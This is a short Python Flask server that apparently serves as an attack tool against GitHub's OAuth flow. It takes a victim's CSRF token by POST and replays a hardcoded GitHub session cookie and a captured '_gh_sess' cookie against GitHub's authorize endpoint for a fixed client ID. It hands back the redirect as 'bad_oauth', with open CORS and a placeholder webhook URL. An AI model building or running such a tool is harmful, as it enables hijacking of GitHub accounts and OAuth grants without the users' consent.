import httpx
import time
import json
from flask import Flask, redirect, request, jsonify
from dataclasses import dataclass
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
webhook_url="xxx"

@dataclass
class Common:
    #Not our last cookie, this stuff is weird bro
    LastCookie: str
def getOauthUrl(cookie: str, csrf_token: str) -> str:
    if cookie:
        cookies = {
            '_gh_sess': cookie,
            'user_session': 'xxxx'
        }
    
    else:
        cookies = {
            '_gh_sess': Common.LastCookie,
            'user_session': 'xxxxx'
        }

    response = httpx.get(f'https://github.com/login/oauth/authorize?client_id=8481f3da3d32562f7226&scope=user:email&state={csrf_token}', cookies=cookies)
    Common.LastCookie = response.cookies.get('_gh_sess')
    print(Common.LastCookie)
    return response.headers['location']


@app.route('/recieve', methods=['POST'])
def recieve():
    data = request.json
    csrf_token = data.get('csrf_token')
    bad_oauth = getOauthUrl(Common.LastCookie, csrf_token)
    return jsonify({"url": bad_oauth})